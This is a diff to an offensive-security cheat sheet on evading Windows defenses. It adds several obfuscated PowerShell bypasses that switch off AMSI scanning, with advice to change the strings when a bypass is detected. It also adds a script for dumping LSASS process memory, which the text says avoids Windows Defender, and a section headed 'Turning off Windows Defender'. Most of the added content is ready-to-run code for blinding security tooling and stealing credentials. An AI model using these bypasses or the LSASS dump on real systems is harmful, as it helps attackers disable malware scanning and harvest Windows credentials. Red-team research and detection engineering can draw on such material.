@@ -30,7 +30,6 @@ One enumeration method for bypassing is compare target versions to bypass with [
 
 [[Nishang-Helpsheet]] - `Invoke-Amsibypass` will use  publicly known methods to bypass/avoid AMSI.
 
-
 #### Patching asmi.dll
 
 The bypasses that will identify DLL locations and modify memory permissions to return undetected AMSI response values.
@@ -67,6 +66,63 @@ Matt Graebers second Reflection method
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
+If patched, just change up the strings/variables. 
+```powershell
+$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
+$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
+$field.SetValue($null,$true)
+```
+Requires Credit!
+
+If patched, just change up the strings/variables. 
+```powershell
+$A="5492868772801748688168747280728187173688878280688776"
+$B="8281173680867656877679866880867644817687416876797271"
+function C($n, $m){
+[string]($n..$m|%{[char][int](29+($A+$B).
+    substring(($_*2),2))})-replace " "}
+$k=C 0 37; $r=C 38 51
+$a=[Ref].Assembly.GetType($k)
+$a.GetField($r,'NonPublic,Static').SetValue($null,$true)
+```
+@TihanyiNorbert (Based on the original work of Matt Graeber @mattifestation script)
+
+```powershell
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+[Buaq.net](https://buaq.net/go-98295.html)
+
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
+```
+
+
+
+#### LSASS Dumping without triggering Windows Defender
+```powershell
+$S = "C:\temp"
+$P = (Get-Process lsass)
+$A = [PSObject].Assembly.GetType('Syst'+'em.Manage'+'ment.Autom'+'ation.Windo'+'wsErrorRe'+'porting')
+$B = $A.GetNestedType('Nativ'+'eMethods', 'Non'+'Public')
+$C = [Reflection.BindingFlags] 'NonPublic, Static'
+$D = $B.GetMethod('MiniDum'+'pWriteDump', $C) 
+$PF = "$($P.Name)_$($P.Id).dmp"
+$PDP = Join-Path $S $PF
+$F = New-Object IO.FileStream($PDP, [IO.FileMode]::Create)
+$R = $D.Invoke($null, @($P.Handle,$G,$F.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
+$F.Close()
+```
+
+
+
+#### Elevated Required
+
+Turning off Windows Defender
+```powershell
+# Requires Elevation
+Get-MpPreference | Select-Object -Property ExclusionPath
+```
 
 #### PowerShell downgrading
 
@@ -86,3 +142,5 @@ Matt Graebers second Reflection method
 [InsecurePowershell](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master)
 [S3cur3Th1sSh1t's currated List](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
 [Matt Graeber's Reflection](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
+[Buaq.net](https://buaq.net/go-98295.html)
+[Sinfulz Cheatsheet](https://github.com/sinfulz/JustEvadeBro)
